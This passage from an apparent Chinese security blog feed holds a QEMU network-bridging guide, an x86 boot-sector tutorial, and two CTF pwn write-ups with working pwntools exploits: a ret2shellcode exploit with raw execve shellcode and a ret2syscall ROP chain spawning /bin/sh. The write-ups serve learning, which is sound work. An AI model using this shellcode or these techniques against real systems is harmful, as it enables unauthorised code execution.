    <content><![CDATA[<h1 id="用qemu桥接最简单粗暴的方法-win10"><a href="#用qemu桥接最简单粗暴的方法-win10" class="headerlink" title="用qemu桥接最简单粗暴的方法-win10"></a>用qemu桥接最简单粗暴的方法-win10</h1><p>首先打开网络适配器康康有没有TAP开头的这样的网卡，如果没有，可以去下个OpenVPN或者直接下这个链接：<a href="http://swupdate.openvpn.org/community/releases/tap-windows-9.21.2.exe">http://swupdate.openvpn.org/community/releases/tap-windows-9.21.2.exe</a></p>
<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/oijFkygG42YNOSH.png" alt="image-20211026205903284"></p>
<p>安装完后，打开网络连接，需要把网卡默认的名字改为tap0</p>
<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/28wBd4JcPR7vAHZ.png" alt="image-20211026210309498"></p>
<p>然后选中WLAN和tap0他俩，点击后会断网（正常）</p>
<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/8EjmQpuPIOD9VCo.png" alt="image-20211026210412783"></p>
<p>此时我们再去启动qemu（最好在桥接后启动，不然桥接前就启动tap0会断掉，最后还得重新启动），此时显示就是”已启用，桥接的“，再右键操作如下图就行了</p>
<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/pYiPhCLWof12uJ9.png" alt="image-20211026205401095"></p>
<p>在qemu虚拟机中ip设为桥接的同一网段（如果发现一会传输失败了，那么需要去修改qemu里的/etc/network下的interfaces，把ip配置都改为静态的，这样就不会中途断掉了）</p>
<p><code>if config eth0 192.168.8.132/24</code></p>
<p>就这么简单，配置完后，ping没问题，ssh也ok，酱我们就成功辽</p>
<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/pgfQKruwA7hi3JE.png" alt="image-20211026205114924"></p>
<p>用完后断开也贼方便，断掉后就自动恢复了</p>
<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/JYy5M4FmWT8ipj1.png" alt="image-20211026210733229"></p>
<h1 id="qemu在ubuntu如何桥接"><a href="#qemu在ubuntu如何桥接" class="headerlink" title="qemu在ubuntu如何桥接"></a>qemu在ubuntu如何桥接</h1><p>安装网桥工具：</p>
<p><code>sudo apt-get install bridge-utils</code></p>
<p>添加网桥：</p>
<p><code>sudo brctl addbr Virbr0</code></p>
<p>设置网桥ip：</p>
<p><code>sudo ifconfig Virbr0 192.168.153.1/24 up</code></p>
<p>安装tunctl（如果没有tunctl的，也可以先输入tunctl回车，ubuntu会告诉你用哪条命令让你安装）</p>
<p><code>sudo apt install uml-utilities</code></p>
<p>将tap0启动，输入命令后会有一个消息显示的，然后ifconfig发现tap0出现了说明成功</p>
<p><code>sudo tunctl -t tap0</code></p>
<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/5tuEJxVMdk3bgF9.png" alt="image-20211028151000467"></p>
<p>为tap0设置ip，这里只要跟我们的宿主机的网桥ip在同一个网段即可（如果只是为了用scp传东西的话）</p>
<p><code>sudo ifconfig tap0 192.168.153.11/24 up</code></p>
<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/2KrJDsimcBAl1ZE.png" alt="image-20211028151603818"></p>
<p>将tap0和Virbr0桥接：</p>
<p><code>sudo brctl addif Virbr0 tap0</code></p>
<p>最后在qemu里把ip设置成跟Virbr0同一个网段的ip即可ping通了</p>
<p><code>ifconfig eth0 192.168.153.2/24</code></p>
<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/hIwgAxv25VUSotr.png" alt="image-20211028160313946"></p>
<p>检测scp也ok</p>
<p><code>scp test.tar.gz root@192.168.153.2:/root</code></p>
<p><img src="https://re1own.github.io/assets/img/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&&ubuntu)/HpjOKv157ZfqVi3.png" alt="image-20211028161104917"></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>踩坑</tag>
        <tag>qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2shellcode</title>
    <url>/2021/12/08/ret2shellcode/</url>
    <content><![CDATA[<h1 id="sniperoj-pwn100-shellcode-x86-64"><a href="#sniperoj-pwn100-shellcode-x86-64" class="headerlink" title="sniperoj-pwn100-shellcode-x86-64"></a>sniperoj-pwn100-shellcode-x86-64</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="sniperoj-pwn100-shellcode-x86-64">题目sniperoj-pwn100-shellcode-x86-64</a></p>
<p>查看保护，ret2shellcode类型的题是没有NX保护的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/pwn]</span><br><span class="line">└─<span class="comment"># checksec shellcode </span></span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/shellcode&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>从main中不难发现buf泄露了它的地址，并且存在栈溢出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Sniperoj!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do your kown what is it : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now give me your answer : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>计算eip到buf的距离</strong>：断点到leave，算出buf到eip距离为rbp - rsp + 8 = 0x7fffde3d2820 - 0x7fffde3d2810 + 8 = 18 bytes</p>
<p><img src="https://s2.loli.net/2021/12/08/bDMjrVh1OuSsCcn.png" alt="image-20211208112148036"></p>
<p>用shellcraft生成64位的shellcode是44字节的，大于了buf上到eip能填充的18个字节，因此，shellcode不能放在buf上，而是放在eip的后面，将eip的地址保存的值覆盖为eip后面的地址，后面就是填充shellcode了，足足有0x40 - 0x10 - 8 = 0x28 = 40个字节，同样也不能用shellcraft生成的，我们去网站上找一个短的</p>
<p>这些都行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.exploit-db.com/shellcodes/43550</span><br><span class="line"></span><br><span class="line">https://www.exploit-db.com/shellcodes/46907</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2021/12/08/kD5VgPsNjpSym3v.png" alt="1228809-20200129231359311-275271508"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    buf_addr = p.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    fillw_addr = <span class="built_in">int</span>(buf_addr,<span class="number">16</span>) + <span class="number">24</span> + <span class="number">8</span></span><br><span class="line">    shellcode=<span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span><span class="comment"># 23字节的shellcode</span></span><br><span class="line">    p.sendline(<span class="number">24</span>*<span class="string">&#x27;a&#x27;</span>+p64(fillw_addr)+shellcode)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>打通！</p>
<p><img src="https://s2.loli.net/2021/12/08/8HGw6vXP3zhWJis.png" alt="image-20211208113140681"></p>
<h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p><a href="https://www.cnblogs.com/Mayfly-nymph/p/12239445.html#ret2shellcode">栈溢出练习(1) - Hk_Mayfly - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>ret2shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2syscall</title>
    <url>/2021/12/09/ret2syscall/</url>
    <content><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="ret2syscall">题目ret2syscall</a></p>
<p>查看保护，开启了NX保护，不能ret2shellcode</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/ret2sys]</span><br><span class="line">└─<span class="comment"># checksec rop </span></span><br><span class="line">[*] <span class="string">&#x27;/home/ret2sys/rop&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>反汇编主函数，很显然gets会导致栈溢出，v4相对于ebp的偏移量为108字节，需要覆盖的返回地址距离v4的偏移量为112字节</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反汇编后没发现有system可以直接调用，没法ret2text，并且发现通过puts泄露地址去猜libc也不太适用，因为程序中有它自己写的puts函数，没法泄露和计算libc的加载基地址</p>
<p><img src="https://s2.loli.net/2021/12/09/RkT5AvYybeJ3qaE.png" alt="image-20211209091500843"></p>
<p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。采取使用ret2syscall即控制程序执行系统调用，获取 shell。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="关于系统调用"><a href="#关于系统调用" class="headerlink" title="关于系统调用"></a>关于系统调用</h3><h4 id="系统调用介绍"><a href="#系统调用介绍" class="headerlink" title="系统调用介绍"></a>系统调用介绍</h4><p>Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号（在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和 <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。）来区分入口函数。操作系统实现系统调用的基本过程是：</p>
<ol>
<li>应用程序调用库函数（API）；</li>
<li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
<li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
<li>中断处理函数返回到 API 中；</li>
<li>API 将 EAX 返回给应用程序。</li>
</ol>
<p>应用程序调用系统调用的过程是：</p>
<ol>
<li>把系统调用的编号存入 EAX；</li>
<li>把函数参数存入其它通用寄存器；</li>
<li>触发 0x80 号中断（int 0x80）。</li>
</ol>
<h4 id="如何使用系统调用"><a href="#如何使用系统调用" class="headerlink" title="如何使用系统调用"></a>如何使用系统调用</h4><p>这里列出几个典型的系统调用号，具体更多的可以参考：<a href="https://www.cnblogs.com/gsharpsh00ter/p/6402104.html">Linux系统调用号 - gsharpsh00ter - 博客园 (cnblogs.com)</a></p>
<p>Linux在用int 0x80进行系统调用时，调用号存在于EAX，第一个参数存在于EBX，第二个参数存在于ECX，第三个参数存在于EDX</p>
<table>
<thead>
<tr>
<th><strong>%eax</strong></th>
<th><strong>Name</strong></th>
<th><strong>Source</strong></th>
<th><strong>%ebx</strong></th>
<th><strong>%ecx</strong></th>
<th><strong>%edx</strong></th>
<th><strong>%esx</strong></th>
<th><strong>%edi</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>sys_exit</td>
<td>kernel/exit.c</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>2</td>
<td>sys_fork</td>
<td>arch/i386/kernel/process.c</td>
<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#pt_regs">struct pt_regs</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>3</td>
<td>sys_read</td>
<td>fs/read_write.c</td>
<td>unsigned int</td>
<td>char *</td>
<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t">size_t</a></td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>4</td>
<td>sys_write</td>
<td>fs/read_write.c</td>
<td>unsigned int</td>
<td>const char *</td>
<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t">size_t</a></td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>5</td>
<td>sys_open</td>
<td>fs/open.c</td>
<td>const char *</td>
<td>int</td>
<td>int</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>6</td>
<td>sys_close</td>
<td>fs/open.c</td>
<td>unsigned int</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>7</td>
<td>sys_waitpid</td>
<td>kernel/exit.c</td>
<td>pid_t</td>
<td>unsigned int *</td>
<td>int</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>8</td>
<td>sys_creat</td>
<td>fs/open.c</td>
<td>const char *</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>9</td>
<td>sys_link</td>
<td>fs/namei.c</td>
<td>const char *</td>
<td>const char *</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>10</td>
<td>sys_unlink</td>
<td>fs/namei.c</td>
<td>const char *</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>11</td>
<td>sys_execve</td>
<td>arch/i386/kernel/process.c</td>
<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#pt_regs">struct pt_regs</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
</tbody></table>
<p>此次利用中，我们第一个参数是/bin/sh，其实sh的地址也ok，后面的参数都是空也就是0，换作寄存器就是ebx指向/bin/sh的地址，ecx，edx等于0    </p>
<p><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p>
<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>首先要让eax = 0xb，那么需要找的指令是pop eax，但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，所以pop之后还需要一个ret返回到控制程序执行流</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/ret2sys]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span></span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>

<p>选择<code>0x080bb196 : pop eax ; ret</code></p>
<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/ret2sys]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span></span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>选择<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code>（这个可以直接控制其它三个寄存器。）</p>
<p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/ret2sys]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>

<p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/ret2sys]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary rop  --only &#x27;int&#x27;        </span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure>



<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sh = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">    pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">    pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">    int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">    binsh = <span class="number">0x80be408</span></span><br><span class="line">    payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure>

<p>打通！</p>
<p><img src="https://s2.loli.net/2021/12/09/YXwrMnkpJFdamcq.png"></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.cnblogs.com/gsharpsh00ter/p/6402104.html">Linux系统调用号 - gsharpsh00ter - 博客园 (cnblogs.com)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>ret2syscall</tag>
      </tags>
  </entry>
  <entry>
    <title>x86ASM编写主引导扇区</title>
    <url>/2020/11/24/x86ASM%E7%BC%96%E5%86%99%E4%B8%BB%E5%BC%95%E5%AF%BC%E6%89%87%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="编写主引导扇区程序"><a href="#编写主引导扇区程序" class="headerlink" title="编写主引导扇区程序"></a>编写主引导扇区程序</h1><p>test.asm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, 0x30</span><br><span class="line">mov dx, 0xC0</span><br><span class="line">add ax, dx</span><br><span class="line"></span><br><span class="line">times 502 db 0</span><br><span class="line"></span><br><span class="line">db 0x55</span><br><span class="line">db 0xAA</span><br></pre></td></tr></table></figure>

<p>一个扇区有512个字节，前面一共是8个字节，后面有2个字节，中间就只需要填充502个字节了</p>
<p>对源程序进行编译:<code>nasm -f bin test.asm -o test.bin</code></p>
<p>test.bin的二进制如下:<br><strong>一个有效的主引导扇区程序，其最后的两个字节数据必须是0x55, 0xAA(规定的)</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd52g7h9j31280u0qdg.jpg" alt="image-20210522002248908"></p>
<h1 id="创建虚拟硬盘并向虚拟硬盘中写入主引导扇区程序"><a href="#创建虚拟硬盘并向虚拟硬盘中写入主引导扇区程序" class="headerlink" title="创建虚拟硬盘并向虚拟硬盘中写入主引导扇区程序"></a>创建虚拟硬盘并向虚拟硬盘中写入主引导扇区程序</h1><p>创建虚拟硬盘</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd4woj8hj30hu0hstau.jpg" alt="image-20210522002322591"></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd53pv82j30k80psabr.jpg" alt="image-20210522002334852"></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd51vgngj30j20osq4s.jpg"></p>
<p>查看刚刚创建的虚拟硬盘</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd538411j30o60ba0u6.jpg" alt="image-20210522002408926"></p>
<p>把之前编译的bin文件写入到虚拟硬盘中</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd4y4o0hj311c0oaaax.jpg" alt="image-20210522002420227"></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd4uy1vhj31120okgmw.jpg" alt="image-20210522002433268"></p>
<p>打开bochs，调好参数</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd50gtg5j31ha0t4whe.jpg" alt="image-20210522002443901"></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd50ye89j30u00vcju3.jpg" alt="image-20210522002449835"></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd52rwhrj30tu0vogmz.jpg" alt="image-20210522002455062"></p>
<h1 id="调试主引导扇区程序"><a href="#调试主引导扇区程序" class="headerlink" title="调试主引导扇区程序"></a>调试主引导扇区程序</h1><p>start后，左边是虚拟机调试窗口，右边是虚拟机的显示器</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd4zcm4nj32c50u0ws2.jpg" alt="image-20210522002509425"></p>
<p>Next at t=0<br>[0x0000fffffff0] f000:fff0 (unk. ctxt): jmpf 0xf000:e05b          ; ea5be000f0<br>t表示当前的内部时钟是0，下一条指令在此基础上执行然后依次是物理地址、逻辑地址、汇编指令、机器码<br>仔细看会发现，物理地址和逻辑地址是不一致的，这个原因以后再解释，只会出现在刚加电的时候</p>
<p><code>sreg</code>查看段寄存器内容</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd51imhwj31j00tuakz.jpg" alt="image-20210522002522235"></p>
<p><code>r</code>显示通用寄存器</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd4vwe7hj31j20ten5p.jpg" alt="image-20210522002532187"></p>
<p><code>s</code>单步执行<br><code>b</code>设置断点<br><code>c</code>执行到断点</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd4w9dplj316w0hm44l.jpg" alt="image-20210522002541899"></p>
<p>执行完后发现右边的显卡已经初始化了,下一步执行 <code> mov ax, 0x0030</code>是我们之前写的程序的第一条命令</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd4xe6hvj32h80tc7lh.jpg" alt="image-20210522002550957"></p>
<p>继续往下发现都符合，主引扇区写入成功</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd4vbjiij313k0fw42s.jpg" alt="image-20210522002602679"></p>
]]></content>
      <tags>
        <tag>ASM</tag>
      </tags>
  </entry>
  <entry>
    <title>未知libc的ret2libc_攻防世界pwn-100</title>
    <url>/2021/11/30/%E6%9C%AA%E7%9F%A5libc%E7%9A%84ret2libc-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/</url>
    <content><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="pwn-100">题目</a></p>
<p>查看保护</p>
